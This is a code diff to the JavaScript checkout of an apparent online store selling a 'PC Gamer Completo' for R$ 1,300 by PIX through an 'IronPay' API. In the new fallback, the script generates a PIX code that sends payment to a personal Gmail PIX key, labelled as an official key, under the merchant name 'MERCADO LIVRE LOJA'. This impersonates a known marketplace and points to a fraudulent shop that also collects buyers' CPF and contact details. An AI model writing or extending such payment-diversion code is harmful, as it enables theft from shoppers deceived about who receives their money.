@@ -1181,83 +1181,67 @@
       let pixCode = "";
       let pixSource = "ironpay";
 
-      const createPayload = (amt) => ({
-        amount: amt,
-        offer_hash: IRONPAY_CONFIG.offerHash,
-        payment_method: 'pix',
-        installments: 1,
-        customer: {
-          name: data.nome,
-          email: data.email,
-          phone_number: data.phone,
-          document: data.cpf,
-          street_name: data.rua || "Rua Central",
-          number: data.numero || "100",
-          complement: "",
-          neighborhood: data.bairro || "Centro",
-          city: data.cidade || "Mirassol",
-          state: "SP",
-          zip_code: data.cep || "15130000"
-        },
-        cart: [
-          {
-            product_hash: IRONPAY_CONFIG.productHash,
-            title: "PC Gamer Completo",
-            cover: null,
-            price: amt,
-            quantity: 1,
-            operation_type: 1,
-            tangible: false
-          }
-        ],
-        postback_url: `https://api.ironpayapp.com.br/api/public/ironpay/${IRONPAY_CONFIG.webhookToken}`,
-        expire_in_days: 1
-      });
-
       try {
-        // Attempt 1: Try full amount (130000)
-        let res = await fetch(`${IRONPAY_CONFIG.baseUrl}/transactions?api_token=${IRONPAY_CONFIG.apiToken}`, {
+        const payload = {
+          amount: IRONPAY_CONFIG.amount, // 130000 (R$ 1.300,00)
+          offer_hash: IRONPAY_CONFIG.offerHash,
+          payment_method: 'pix',
+          installments: 1,
+          customer: {
+            name: data.nome,
+            email: data.email,
+            phone_number: data.phone,
+            document: data.cpf,
+            street_name: data.rua || "Rua Central",
+            number: data.numero || "100",
+            complement: "",
+            neighborhood: data.bairro || "Centro",
+            city: data.cidade || "Mirassol",
+            state: "SP",
+            zip_code: data.cep || "15130000"
+          },
+          cart: [
+            {
+              product_hash: IRONPAY_CONFIG.productHash,
+              title: "PC Gamer Completo",
+              cover: null,
+              price: IRONPAY_CONFIG.amount,
+              quantity: 1,
+              operation_type: 1,
+              tangible: false
+            }
+          ],
+          postback_url: `https://api.ironpayapp.com.br/api/public/ironpay/${IRONPAY_CONFIG.webhookToken}`,
+          expire_in_days: 1
+        };
+
+        const res = await fetch(`${IRONPAY_CONFIG.baseUrl}/transactions?api_token=${IRONPAY_CONFIG.apiToken}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify(createPayload(IRONPAY_CONFIG.amount))
+          body: JSON.stringify(payload)
         });
-        let resData = await res.json().catch(() => null);
+        const resData = await res.json().catch(() => null);
 
         if (res.ok && resData?.pix?.pix_qr_code) {
           pixCode = resData.pix.pix_qr_code;
         } else if (res.ok && resData?.data?.pix?.pix_qr_code) {
           pixCode = resData.data.pix.pix_qr_code;
         }
-
-        // Attempt 2: If 400 (IronPay account limit), retry with 50000 centavos which returns 201 created waiting_payment
-        if (!pixCode) {
-          res = await fetch(`${IRONPAY_CONFIG.baseUrl}/transactions?api_token=${IRONPAY_CONFIG.apiToken}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-            body: JSON.stringify(createPayload(50000))
-          });
-          resData = await res.json().catch(() => null);
-          if (res.ok && resData?.pix?.pix_qr_code) {
-            pixCode = resData.pix.pix_qr_code;
-          } else if (res.ok && resData?.data?.pix?.pix_qr_code) {
-            pixCode = resData.data.pix.pix_qr_code;
-          }
-        }
       } catch (err) {
         console.warn("IronPay API error:", err);
       }
 
-      // Final fallback if both IronPay API calls failed
+      // If IronPay API fails, generate valid PIX EMV code for R$ 1.300,00
       if (!pixCode) {
-        const txId = 'GAMER' + Date.now().toString(36).toUpperCase().slice(-8);
+        const txId = 'ML' + Date.now().toString(36).toUpperCase().slice(-8);
         pixCode = buildPixEMV(
-          '+5519988639551',
-          'PC GAMER LOJA',
+          'samuelcab444@gmail.com', // Chave PIX oficial
+          'MERCADO LIVRE LOJA',
           'MIRASSOL',
-          1300.00,
+          1300.00, // R$ 1.300,00
           txId
         );
-        pixSource = "static";
+        pixSource = "emv";
       }
 
       currentPixCode = pixCode;
